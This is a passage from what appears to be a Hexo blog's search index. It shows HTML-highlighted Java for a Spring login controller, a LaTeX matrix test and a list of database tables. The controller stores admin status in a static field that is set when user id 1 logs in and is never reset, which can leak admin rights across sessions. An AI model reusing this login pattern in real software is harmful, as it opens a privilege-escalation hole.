isadmin = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = Logger.getLogger(PageController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/login/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>, defaultValue = <span class="string">"null"</span>)</span> String name,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>, defaultValue = <span class="string">"null"</span>)</span> String password,</span></span><br><span class="line"><span class="function">                        Model model)</span>&#123;<span class="comment">//String username, String password,Model model</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            User user = userService.findUser(name,password);</span><br><span class="line">            <span class="keyword">if</span> (user!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                model.addAttribute(<span class="string">"user"</span>,user);</span><br><span class="line">                <span class="keyword">if</span>(user.getId()==<span class="number">1</span>)&#123;</span><br><span class="line">                    logger.info(<span class="string">"admin status"</span>);</span><br><span class="line">                    isadmin=<span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                logger.info(<span class="string">"login success:username="</span>+name);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"redirect:/newspage/"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                model.addAttribute(<span class="string">"msg"</span>,<span class="string">"nosuchuser"</span>);</span><br><span class="line">                logger.info(<span class="string">"login failed:no such user"</span>);</span><br><span class="line">               <span class="comment">// return "success";</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="latex-math测试"><a href="#latex-math测试" class="headerlink" title="latex math测试"></a>latex math测试</h3><p>$$[\begin{matrix} a&amp;b\\c&amp;d \end{matrix}\quad<br>\begin{pmatrix} a&amp;b\\c&amp;d \end{pmatrix}\quad<br>\begin{bmatrix} a&amp;b\\c&amp;d \end{bmatrix}\quad<br>\begin{Bmatrix} a&amp;b\\c&amp;d \end{Bmatrix}\quad<br>\begin{vmatrix} a&amp;b\\c&amp;d \end{vmatrix}\quad<br>\begin{Vmatrix} a&amp;b\\c&amp;d \end{Vmatrix}\quad]$$</p><h1 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h1><table><thead><tr><th>Tables_in_newsbase</th></tr></thead><tbody><tr><td>hibernate_sequence</td></tr><tr><td>news</td></tr><tr><td>user</td></tr><tr><td>——————–</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> rmi </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
